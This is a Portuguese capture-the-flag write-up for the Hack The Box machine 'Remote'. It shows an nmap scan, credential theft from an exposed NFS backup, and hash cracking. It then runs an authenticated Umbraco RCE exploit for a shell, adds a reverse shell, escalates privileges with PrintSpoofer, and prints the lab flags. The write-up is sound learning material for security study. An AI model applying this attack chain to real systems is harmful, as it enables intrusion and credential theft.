# Writeup remote

## Scan

```bash
# Nmap 7.92 scan initiated Sun Jan 23 21:23:00 2022 as: nmap -sV --open -v -T5 -p- -Pn -oN fullnmap.txt 10.129.95.194
Nmap scan report for 10.129.95.194
Host is up (0.15s latency).
Not shown: 65528 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
111/tcp   open  rpcbind       2-4 (RPC #100000)
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
49666/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 23 21:28:17 2022 -- 1 IP address (1 host up) scanned in 317.10 seconds
```

## Enumeration

Tendo feito o scan, podemos começar a enumerar o host. Apoś enumerar o smb, rpc e ftp e nenhum deles terem apresentado algo de útil, foi a vez da enumeração com `showmount` e `rpcinfo` para enumerar a porta 2049.

Enumeração com rpcinfo para ver a versão nfs: `rpcinfo -p 10.129.221.250 | grep nfs`

Enumeração com showmount para ver o arquivo compartilhado: 

```
└─$ showmount -e 10.129.221.250                                                                                                                                                        130 ⨯
Export list for 10.129.221.250:
/site_backups (everyone)
```

Após criar um diretório e fazer o mount nele com `sudo mount -t nfs -o nfsvers=2 10.129.95.194:/site_backups remote2` podemos pesquisar por algum arquivo que armazena credenciais. Dando uma pesquisada, foi encontrado o link [Umbraco Database Connection Credentials - Stack Overflow](https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials) que nos mostra que um arquivo chamado "Umbraco.sdf" armazena algumas informações interessantes. 

Dando uma olhada nesse arquivo encontramos a seguinte string: 

> admin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"} 

Essa string possui um usuário: admin@htb.local e um hash sha1"b8be16afba8c314ad33d812f22a04991b90e2aaa". Após armazenar essa hash em um arquivo e quebrar usando o john, obtemos sua senha: `baconandcheese`.

**Credenciais de acesso:** 

```
admin@htb.local:baconandcheese
```

Após termos as credenciais de acesso, podemos ver a versão do CMS Umbraco que está rodando: "Umbraco version 7.12.4"

Após uma pesquisada, conseguimos encontrar que essa versão possui um Auth RCE e também foi encontrado o seguinte exploit pra bind rce: [GitHub - Jonoans/Umbraco-RCE: Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution](https://github.com/Jonoans/Umbraco-RCE)

## Exploitation

Tendo encontrado o exploit, podemos usá-lo para pegar uma blind shell no host.

```
└─$ python3 exploit.py -u admin@htb.local -p baconandcheese -w http://10.129.221.250/ -i 10.10.14.73
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:10.129.221.250 on port 49685
[+] Trying to bind to :: on port 4445: Done
[+] Waiting for connections on :::4445: Got connection from ::ffff:10.129.221.250 on port 49686
[*] Switching to interactive mode
PS C:\windows\system32\inetsrv>  
```

Com a nossa bind shell no host, podemos usar o site do reverse shell generator e pegar uma reverse shell pra powershell encodado em b64 e executar na nossa bind shell, apó isso teremos uma shell interativa e podemos pegar a user flag.

**User Flag:**

```
PS C:\Users\Public> type user.txt
b1d187c0b1d1649fd0c9fd309d339d7c
```

## Privilege Escalation

Tendo acesso a máquina podemos ver o privilégio do nosso usuário com `whoami /priv` 

```
PS C:\Users\Public> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\Users\Public>
```

Podmos ver que o privilégio "SeImpersonatePrivilege" está habilitado, o que nos permite fazer atques de impersonate. Para isso podemos usar o printspoofer para explorar a máquina e pegar uma reverse shell com privilégio total e depois pegar a flag.

**Root flag:**

```
PS C:\Users\Administrator\Desktop> type root.txt
9567aba1a3d3719da4dbbdd5533d7fb1
```
